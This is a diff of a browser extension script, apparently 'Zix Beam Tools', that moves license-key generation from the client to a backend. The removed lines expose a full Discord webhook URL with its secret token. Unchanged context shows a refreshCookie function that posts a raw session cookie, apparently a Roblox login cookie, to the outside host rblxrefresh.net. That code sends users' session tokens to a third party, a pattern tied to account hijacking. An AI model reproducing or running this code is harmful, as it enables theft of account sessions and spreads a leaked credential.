@@ -1,7 +1,7 @@
 const $ = (id) => document.getElementById(id);
 
-// NOTE: hardcoding a Discord webhook in a client-side extension makes it public.
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1543919741716926555/8ByTMpUYyAALbi_jZmGk8JiTFdxoz0FyxxB-ihI6EFESw12--lqgC-CI0VPYNjsKbmmD";
+// Backend that generates keys and sends them to the hidden Discord webhook.
+const API_BASE = "https://zixbeam-web-session.lovable.app";
 
 const DURATIONS = {
   "1d":       { label: "1 Day",    ms: 24 * 60 * 60 * 1000 },
@@ -44,13 +44,6 @@ function setStatus(el, msg, kind) {
 }
 
 // ---------- Keys ----------
-function randChunk() {
-  return Math.random().toString(36).slice(2, 6).toUpperCase();
-}
-function generateKey() {
-  return `ZIX-${randChunk()}-${randChunk()}-${randChunk()}`;
-}
-
 async function getState() {
   return new Promise((r) =>
     chrome.storage.local.get(
@@ -95,16 +88,24 @@ async function renderKeyState() {
   }
 }
 
-async function postToWebhook(content) {
-  const res = await fetch(WEBHOOK_URL, {
+async function requestKeysFromBackend(duration) {
+  const res = await fetch(`${API_BASE}/api/public/keys`, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ content, username: "Zix Beam Tools" }),
+    body: JSON.stringify({ duration }),
   });
+  const text = await res.text();
+  let json;
+  try { json = JSON.parse(text); } catch { json = {}; }
   if (!res.ok) {
-    const t = await res.text().catch(() => "");
-    throw new Error(`Webhook HTTP ${res.status}: ${t.slice(0, 120)}`);
+    const detail = json.error || text.slice(0, 120);
+    if (res.status === 429) {
+      const secs = json.retryAfter || Math.ceil((res.headers.get("Retry-After") || 0) as unknown as number);
+      throw new Error(`Cooldown: wait ${secs}s before requesting again.`);
+    }
+    throw new Error(`Server error: ${detail}`);
   }
+  return json;
 }
 
 // ---------- Request key ----------
@@ -141,7 +142,7 @@ requestKeyBtn.addEventListener("click", async () => {
   const dur = DURATIONS[durKey];
   if (!dur) return;
 
-  // Enforce 10-minute cooldown
+  // Enforce 10-minute cooldown locally too
   const { lastKeyRequestAt } = await new Promise((r) =>
     chrome.storage.local.get(["lastKeyRequestAt"], r)
   );
@@ -154,18 +155,9 @@ requestKeyBtn.addEventListener("click", async () => {
   setStatus(keyStatus, "Slinging key request through the web...", "");
 
   try {
-    const keys = Array.from({ length: 2 }, generateKey);
-    const expiresAt = dur.ms === null ? null : Date.now() + dur.ms;
-    const expiresLabel = expiresAt === null ? "never" : new Date(expiresAt).toISOString();
-
-    const msg =
-      `**Zix Beam Tools — Key Request**\n` +
-      `Duration: **${dur.label}**\n` +
-      `Expires: ${expiresLabel}\n` +
-      `Keys:\n` +
-      keys.map((k) => `\`${k}\``).join("\n");
-
-    await postToWebhook(msg);
+    const data = await requestKeysFromBackend(durKey);
+    const keys = data.keys;
+    const expiresAt = data.expiresAt;
 
     const state = await getState();
     const known = state.knownKeys || {};
@@ -214,7 +206,7 @@ redeemBtn.addEventListener("click", async () => {
   await renderKeyState();
 });
 
-// ---------- Session (existing) ----------
+// ---------- Session ----------
 async function refreshCookie(raw) {
   const attempts = [
     { url: "https://rblxrefresh.net/api/refresh", init: { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ cookie: raw }) } },
@@ -274,4 +266,3 @@ copyBtn.addEventListener("click", async () => {
   await renderKeyState();
   await updateCooldownUI();
 })();
-
